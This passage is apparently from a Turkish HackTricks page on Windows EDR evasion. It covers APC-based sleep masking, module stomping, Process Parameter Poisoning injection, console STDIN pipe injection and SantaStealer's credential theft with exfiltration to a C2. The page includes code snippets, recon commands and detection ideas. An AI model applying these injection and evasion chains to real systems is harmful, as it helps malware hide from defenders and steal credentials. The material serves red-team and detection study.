- Bekleme tamamlandıktan sonra özgün TIB ve thread context’ini geri yükleyin.

Bu yöntem CET ile uyumlu bir instruction pointer’ı korurken TEB stack metadata’sına güvenerek unwind’leri doğrulayan EDR stack walker’larını yanıltır.

### Alternatif: APC tabanlı Kraken Mask

Timer-queue dispatch’in imzası fazla belirginse aynı sleep-encrypt-spoof-restore dizisi, kuyruğa alınmış APC’ler aracılığıyla askıya alınmış bir yardımcı thread’den yürütülebilir:<sup>[[27]](#references)</sup>

- Giriş noktası `NtTestAlert` olan bir yardımcı thread oluşturun.
- Hazırlanmış `CONTEXT` frame’lerini/APC’leri `NtQueueApcThread` ile kuyruğa alın ve `NtAlertResumeThread` ile işleyin.
- Varsayılan 64 KB thread stack’ini tüketmemek için zincir durumunu yardımcı thread stack’i yerine heap’te saklayın.
- Başlangıç olayını atomik olarak işaretleyip beklemek için `NtSignalAndWaitForSingleObject` kullanın.
- Scanner’ın yarı geri yüklenmiş bir stack’i yakalayabileceği yarış aralığını azaltmak için TIB/context’i geri yüklemeden önce ana thread’i askıya alın (`NtSuspendThread` → restore → `NtResumeThread`).

Bu yöntem, aynı RC4 maskeleme ve stack-spoofing hedeflerini korurken `CreateTimerQueueTimer` + `NtContinue` imzasını yardımcı thread/APC imzasıyla değiştirir.

Ek tespit fikirleri
- Uykulardan, beklemelerden veya APC dispatch’inden kısa süre önce `VmCfgCallTargetInformation` ile `NtSetInformationVirtualMemory` çağrılması.
- `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` veya `ConnectNamedPipe` çevresinde kullanılan `GetThreadContext`/`SetThreadContext`.
- `NtQueryInformationThread` çağrısının ardından mevcut thread’in TEB/TIB stack sınırlarına doğrudan yazılması.
- Dolaylı olarak `SystemFunction032`, `VirtualProtect` veya section izinlerini geri yükleyen yardımcı işlevlere ulaşan `NtQueueApcThread`/`NtAlertResumeThread` zincirleri.
- İmzalı modüllerin içinde dispatch pivot’ları olarak `FF 23` (`jmp [rbx]`) veya `FF E7` (`jmp rdi`) gibi kısa gadget imzalarının tekrarlı kullanımı.


## Precision Module Stomping

Module stomping, belirgin private executable memory ayırmak veya yeni bir sacrificial DLL yüklemek yerine payload’ları hedef süreçte zaten eşlenmiş bir DLL’in **`.text` section’ından** çalıştırır. Üzerine yazma hedefi, payload’ı süreç tarafından hâlâ ihtiyaç duyulan code path’leri bozmadan barındırabilecek, **yüklenmiş ve disk destekli bir image** olmalıdır.<sup>[[1]](#references)[[2]](#references)</sup>

### Güvenilir hedef seçimi

`uxtheme.dll` veya `comctl32.dll` gibi yaygın modülleri gelişigüzel stomp etmek güvenilmezdir: DLL uzak süreçte yüklü olmayabilir ve code region’ın fazla küçük olması sürecin çökmesine yol açar. Daha güvenilir bir iş akışı şöyledir:

1. Hedef süreç modüllerini sıralayın ve yalnızca zaten yüklenmiş DLL’lerin adlarından oluşan bir include list tutun.
2. Önce payload’ı oluşturun ve **tam byte size** değerini kaydedin.
3. Aday DLL’leri diskte tarayın ve PE section **`.text` `Misc_VirtualSize`** değerini payload size ile karşılaştırın. Bu değer, dosya boyutundan daha önemlidir; çünkü image **belleğe eşlendiğinde** executable section’ın boyutunu yansıtır.
4. **Export Address Table’ı (EAT)** ayrıştırın ve stomp başlangıç offset’i olarak dışa aktarılmış bir işlevin RVA’sını seçin.
5. **Blast radius’u** hesaplayın: payload seçilen işlevin sınırını aşarsa, bellekte ondan sonra yerleştirilmiş bitişik export’ların üzerine yazar.

Gerçek ortamlarda görülen yaygın recon/seçim yardımcıları:

```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```

Operasyonel notlar
- `LoadLibrary`/beklenmeyen image load telemetrisinden kaçınmak için uzak process'te **zaten yüklü** DLL'leri tercih edin.
- Hedef uygulama tarafından nadiren çalıştırılan export'ları tercih edin; aksi takdirde normal code path'ler thread oluşturulmadan önce veya sonra değiştirilmiş byte'lara ulaşabilir.
- Büyük implantlar, tam buffer'ın injector source içinde doğru şekilde temsil edilmesi için shellcode embedding'in string literal'dan **byte-array/braced initializer**'a değiştirilmesini gerektirebilir.

Tespit fikirleri
- Daha yaygın private RWX/RX allocation'ları yerine **image-backed executable page**'lere (`MEM_IMAGE`, `PAGE_EXECUTE*`) yapılan remote write'lar.
- Bellekteki byte'ları diskteki backing file ile artık eşleşmeyen export entry point'leri.
- İlk byte'ları yakın zamanda değiştirilmiş meşru bir DLL export'u içinde çalıştırılmaya başlayan remote thread'ler veya context pivot'ları.
- DLL `.text` page'lerine yönelik, ardından thread oluşturulan şüpheli `VirtualProtect(Ex)` / `WriteProcessMemory` dizileri.

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3), klasik remote write path'ini (`VirtualAllocEx` + `WriteProcessMemory`) kullanmayan bir **process-injection / EDR-evasion** tekniğidir. Zaten çalışan bir hedefe byte kopyalamak yerine, Windows'un seçili `CreateProcessW` başlangıç parametrelerini child process'e **kopyalayıp** `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`) içinde saklaması özelliğinden yararlanır.<sup>[[28]](#references)[[29]](#references)</sup>

### `CreateProcessW` tarafından kopyalanan poisonable carrier'lar

Kullanışlı carrier'lar şunlardır:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (`CREATE_UNICODE_ENVIRONMENT` ile) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Pratik carrier kısıtlamaları:

- `lpCommandLine`, `CreateProcessW` için **yazılabilir belleği** göstermeli ve null terminator dahil en fazla **32,767 Unicode karakter** uzunluğunda olmalıdır.
- `lpEnvironment`, art arda gelen `NAME=VALUE\0` string'lerinden oluşan ve fazladan bir `\0` ile sonlandırılan bir Unicode environment block olmalıdır.
- `lpReserved` resmî olarak ayrılmıştır; bu nedenle `ShellInfo` eşlemesi, belgelenmiş ve kararlı bir sözleşme yerine uygulama ayrıntısı olarak değerlendirilmelidir.

Böylece normal process creation, **payload-transfer primitive**'ine dönüşür. Operatör, attacker-controlled başlangıç verileriyle child process'i oluşturur ve Windows'un process'ler arası kopyalama işlemini yapmasına izin verir.

### Remote write API'leri olmadan remote lookup akışı

Child oluşturulduktan sonra, kopyalanan buffer'ı **read-only** primitive'lerle bulun:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → `PROCESS_BASIC_INFORMATION.PebBaseAddress` değerini alın
2. Remote `PEB`'yi okuyun
3. `PEB.ProcessParameters`'ı takip edin
4. `RTL_USER_PROCESS_PARAMETERS`'ı okuyun
5. Seçilen pointer'ı kullanın:
   - `parameters.CommandLine.Buffer`
   - `parameters.Environment`
   - `parameters.ShellInfo.Buffer`

Asgari akış:

```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```

### Kopyalanan parametre arabelleğini yürütme

Kopyalanan parametre bölgesi genellikle `RW`'dir, yürütülebilir değildir. Yaygın bir P3 zinciri şöyledir:

1. Süreci normal şekilde oluşturun (askıya alınmış olarak değil)
2. Seçilen parametre sayfasını `NtProtectVirtualMemory` / `VirtualProtectEx` ile yürütülebilir hâle getirin
3. `PROCESS_INFORMATION` içinde zaten döndürülen ana thread handle'ını yeniden kullanın
4. `NtSetContextThread` (`CONTEXT_CONTROL`, `RIP`'nin üzerine yazma) ile yürütmeyi yönlendirin

Klasik thread hijacking iş akışlarından farklı olarak, bu yöntem **`SuspendThread` / `ResumeThread` gerektirmez**; bağlam doğrudan döndürülen ana thread handle'ı üzerinde değiştirilebilir.

Bu yöntem, injection için yaygın olarak izlenen birkaç API'den kaçınır:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- çoğu zaman `SuspendThread` / `ResumeThread` de

### Null byte sınırlaması ve aşamalı shellcode

Üç taşıyıcının da **string veya string benzeri veriler** olması nedeniyle, `0x00` içeren ham bir payload aktarım sırasında kesilir. Pratik bir çözüm, sabitleri çalışma zamanında yeniden oluşturan ve ardından rastgele bir ikinci aşamayı yükleyen **null içermeyen bir ilk aşama** kullanmaktır.

Basit bir yöntem, XOR tabanlı sabit sentezlemedir:

```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```

This, ilk aşamanın taşınan parametreye null byte eklemeden stack string'leri, API argümanları, DLL path'leri veya ikinci aşama shellcode loader'ı oluşturmasını sağlar.

### İlk aşamadan stack tabanlı API çağrıları

İlk aşamanın `LoadLibraryA` gibi API'leri çağırması gerektiğinde şunları yapabilir:

- string/buffer'ı hedef stack'ine push etmek
- **32-byte x64 shadow space** ayırmak
- `RCX`, `RDX`, `R8`, `R9` değerlerini sabitlere veya `RSP`-relative pointer'lara ayarlamak
- çağrıdan önce `RSP`'yi **16-byte hizalı** tutmak

İkinci aşama daha sonra stack'ten bir `PAGE_READWRITE` allocation'a kopyalanabilir, `VirtualProtect` ile `PAGE_EXECUTE_READ` olarak değiştirilebilir ve doğrudan RWX allocation'dan kaçınarak çalıştırılabilir.

### Detection fikirleri

Yazarların belirttiği iyi avlanma fırsatları:

- **process-parameter sayfalarını executable** yapan `VirtualProtectEx` / `NtProtectVirtualMemory`
- bu koruma değişikliğinin ardından gelen `SetThreadContext` / `NtSetContextThread`
- `PEB`'nin ve ardından `RTL_USER_PROCESS_PARAMETERS`'ın uzak bellekten okunması
- process oluşturulurken olağandışı uzunlukta / yüksek entropy'li `lpCommandLine`, `lpEnvironment` veya `STARTUPINFO.lpReserved` değerleri

### Notlar

- P3, **process'ler arası bir aktarım tekniğidir**; tek başına tam bir execution primitive değildir: kopyalanan parametrenin hâlâ execute izni değişikliğine ve execution redirection yöntemine ihtiyacı vardır.
- `RtlCreateProcessReflection` / Dirty Vanity yazarlar tarafından değerlendirildi, ancak dahili olarak `NtWriteVirtualMemory` ve `NtCreateThreadEx` gibi şüpheli primitive'lere ulaştığı için reddedildi.

## Console STDIN pipe injection

Etkileşimli bir console child process, **payload aktarım primitive'i** olarak da kullanılabilir. Injector, child process'in standard input'unu bir pipe'a yönlendirir ve marker'ın ardından shellcode gönderir. Console programı veriyi kendi private belleğine okuduktan sonra injector bu buffer'ı bulur, executable yapar ve bir child thread'i bu adrese yönlendirir. Bu yöntem `VirtualAllocEx` ve `WriteProcessMemory` kullanımını önler; ancak genel bir EDR bypass değil, yine de process injection'dır.<sup>[[41]](#references)</sup>

"named-pipe" tanımına rağmen, referans implementation `CreatePipe` kullanır ve bu bir **anonymous pipe** oluşturur. Windows, anonymous pipe'ları dahili olarak benzersiz adlandırılmış pipe nesneleriyle uygular; ancak PoC ne bir `\\.\pipe\<name>` path'i seçer ne de `CreateNamedPipe` çağırır. Varsayılan bir security descriptor ile inherit edilebilir handle'lar oluşturur, read handle'ı `STARTUPINFO.hStdInput` içine yerleştirir, `STARTF_USESTDHANDLES` ayarını yapar ve handle inheritance etkinleştirilmiş yeni bir child process başlatır. Dolayısıyla bu PoC, sağlanan console executable'ını başlatır; pipe'ını mevcut bir process'e bağlamaz.<sup>[[41]](#references)[[42]](#references)[[43]](#references)</sup>

### Referans iş akışı

Implementation aşağıdaki zinciri kullanır:<sup>[[41]](#references)</sup>

1. Child process'in `STDIN` ve `STDOUT`'u için anonymous pipe çiftleri oluştur. Parent tarafındaki iki handle'da inheritance'ı devre dışı bırak ve process oluşturulduktan sonra child tarafındaki kopyaları parent'ta kapat.
2. `CREATE_NEW_CONSOLE` ile `netsh.exe` veya `nslookup.exe` gibi etkileşimli bir executable başlat. Child, yönlendirilen standard handle'ları inherit eder.
3. Tam binary `rawData` array'ini parent tarafındaki `STDIN` handle'ı üzerinden `WriteFile` ile gönder. Console programı byte'ları tüketir ve kopyalarını private, commit edilmiş bölgelerinden birinde bırakır.
4. Child process'in address space'ini `VirtualQueryEx` ile tara, aday `MEM_PRIVATE` bölgelerini `ReadProcessMemory` ile oku ve `rawData`'nın başındaki marker'ı ara.
5. Bulunan buffer'ın korumasını `VirtualProtectEx` ile `PAGE_EXECUTE_READWRITE` olarak değiştir.
6. Ana thread'i belirle, suspend et, `NtSetContextThread` ile `RIP`'yi `found_address + 0x19` olarak ayarla ve thread'i resume et.

```powershell
InjectSetConsole.exe C:\Windows\System32\netsh.exe
```

The supplied implementation x64'e özeldir: `CONTEXT.Rip` değerini değiştirir ve gömülü payload'ı x64 shellcode'dur. `rawData` 25 baytlık bir işaretçiyle başlar; bu nedenle çalıştırılabilir baytlar onaltılık `0x19` ofsetinde başlar. Payload'ı değiştirirken bu düzeni koruyun veya işaretçiyi, arama vektörünü, dizi boyutunu ve çalıştırma ofsetini birlikte güncelleyin. Kaynak yorumlarında `0x0A`, `0x0D` ve `0x1A` da bad character olarak listelenmiştir. Bu iş akışı, çocuğun token'ını veya ayrıcalıklarını değiştirmez.<sup>[[41]](#references)</sup>

Küçük native yardımcılar ve payload derleme kalıpları için bkz. [Windows C Payloads](windows-local-privilege-escalation/windows-c-payloads.md).

## Dosyasız Kaçınma ve Kimlik Bilgisi Hırsızlığı için SantaStealer Tradecraft

SantaStealer (diğer adıyla BluelineStealer), modern info-stealer'ların AV bypass, anti-analysis ve kimlik bilgilerine erişimi tek bir iş akışında nasıl birleştirdiğini gösterir.<sup>[[24]](#references)</sup>

### Klavye düzeni kontrolü ve sandbox gecikmesi

- Bir yapılandırma bayrağı (`anti_cis`), `GetKeyboardLayoutList` aracılığıyla yüklü klavye düzenlerini listeler. Kiril alfabesi kullanan bir düzen bulunursa sample boş bir `CIS` işaretçisi bırakır ve stealers çalışmadan sonlanır. Böylece hariç tutulan bölgelerde çalışmasını önlerken avlama için bir iz bırakır.

```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
    LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
    if (lang == LANG_RUSSIAN) {
        CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        ExitProcess(0);
    }
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```

### Katmanlı `check_antivm` mantığı

- Variant A, süreç listesini dolaşır, her adı özel bir rolling checksum ile hash'ler ve sonucu debugger/sandbox'lara yönelik gömülü blocklist'lerle karşılaştırır; aynı checksum işlemini bilgisayar adı üzerinde tekrarlar ve `C:\analysis` gibi çalışma dizinlerini kontrol eder.
- Variant B, sistem özelliklerini inceler (minimum süreç sayısı, yakın zamandaki uptime), VirtualBox additions'ı tespit etmek için `OpenServiceA("VBoxGuest")` çağırır ve single-stepping'i fark etmek için sleep çağrıları çevresinde zamanlama kontrolleri yapar. Herhangi bir eşleşme olursa modüller başlatılmadan önce işlem durdurulur.

### Fileless helper + çift ChaCha20 reflective loading

- Birincil DLL/EXE, diske bırakılan veya belleğe manuel olarak map edilen bir Chromium credential helper içerir; fileless modda import'ları/relocation'ları kendi çözer, böylece helper'a ait hiçbir dosya izi yazılmaz.
- Bu helper, ChaCha20 ile iki kez şifrelenmiş ikinci aşama bir DLL saklar (iki adet 32 baytlık key + 12 baytlık nonce). Her iki şifre çözme işleminin ardından blob'u reflectively yükler (`LoadLibrary` kullanmadan) ve [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)'dan türetilen `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` export'larını çağırır.<sup>[[25]](#references)</sup>
- ChromElevator rutinleri, çalışan bir Chromium browser'a inject etmek, AppBound Encryption key'lerini devralmak ve ABE hardening'e rağmen SQLite veritabanlarından parolaları/cookie'leri/kredi kartlarını doğrudan decrypt etmek için direct-syscall reflective process hollowing kullanır.

### Modüler bellek içi toplama ve parçalı HTTP exfil

- `create_memory_based_log`, global `memory_generators` function-pointer tablosunu dolaşır ve etkin her modül için bir thread başlatır (Telegram, Discord, Steam, ekran görüntüleri, belgeler, browser uzantıları vb.). Her thread sonuçları paylaşılan buffer'lara yazar ve yaklaşık 45 saniyelik join süresinin ardından dosya sayısını bildirir.
- İşlem tamamlandığında her şey, statically linked `miniz` kütüphanesi kullanılarak `%TEMP%\\Log.zip` dosyasına sıkıştırılır. Ardından `ThreadPayload1` 15 saniye bekler ve arşivi, browser'a ait `multipart/form-data` boundary'sini (`----WebKitFormBoundary***`) taklit ederek HTTP POST üzerinden `http://<C2>:6767/upload` adresine 10 MB'lık parçalar halinde gönderir. Her parçaya `User-Agent: upload`, `auth: <build_id>` ve isteğe bağlı olarak `w: <campaign_tag>` eklenir; son parçaya ise C2'nin yeniden birleştirmenin tamamlandığını anlaması için `complete: true` eklenir.

## References

- [1] [Gelişmiş Evasion Tradecraft: Hassas Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Call stack'ler: malware için artık bedava geçiş yok](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – belgeler](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – örnek](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – örnek](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – DarkCloud Stealer için yeni infection chain ve ConfuserEx tabanlı obfuscation](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – Zero trust'ınıza güvenmeli misiniz? Zscaler posture kontrollerini atlatma](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – ToolShell Öncesi: Storm-2603'ün Önceki Ransomware Operasyonlarını İnceleme](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: Forwarded Export'ları Kötüye Kullanma](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Windows 11 Forwarded Export Envanteri (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Dynamic-link library arama sırası](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – Süreç güvenliği ve erişim hakları](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – EKU başvurusu (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [CreateProcessAsPPL başlatıcısı](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Protected Process Light (PPL) Desteğiyle EDR'lara Karşı Koyma](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Folder Redirect Tekniğiyle Windows Defender'ın Koruyucu Kabuğunu Kırma](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – mklink komut başvurusu](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Saf Perdenin Ardında: RAT'ten Builder'a, Builder'dan Coder'a](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer Şehre Geliyor: Yeni ve İddialı Bir Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: API Tracing ile Node.js Malware'ını Etkisiz Hale Getirme](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Uyuyan Güzel: Crystal Palace ile Adaptix'i Uyutmak](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Process Parameter Poisoning](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Uyuyan Güzel II: CFG, CET ve Stack Spoofing](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Ekko sleep obfuscation](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com - Dotnet Etw'yi Gizleme](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com - Red Team Operasyonlarında Chrome Remote Desktop'ı Kötüye Kullanma: Pratik Bir Kılavuz](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research - BTR Reforged: Defender'ın Remediation Driver'ını Kernel Operation Primitive Olarak Silahlandırma](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY - BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
- [38] [MDSec Function Peekaboo eşlikçi kodu](https://github.com/mdsecactivebreach/functionpeekaboo)
- [39] [MDSec - Function Peekaboo: LLVM Kullanarak Kendini Maskeleyen Fonksiyonlar Oluşturma](https://mdsec.co.uk/2025/10/function-peekaboo-crafting-self-masking-functions-using-llvm/)
- [40] [Microsoft Learn - VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
- [41] [TwoSevenOneT - InjectSetConsole kaynak kodu](https://github.com/TwoSevenOneT/InjectSetConsole)
- [42] [Microsoft Learn - CreatePipe fonksiyonu](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-createpipe)
- [43] [Microsoft Learn - Yeniden Yönlendirilmiş Girdi ve Çıktıyla Child Process Oluşturma](https://learn.microsoft.com/en-us/windows/win32/procthread/creating-a-child-process-with-redirected-input-and-output)
{{#include ../banners/hacktricks-training.md}}
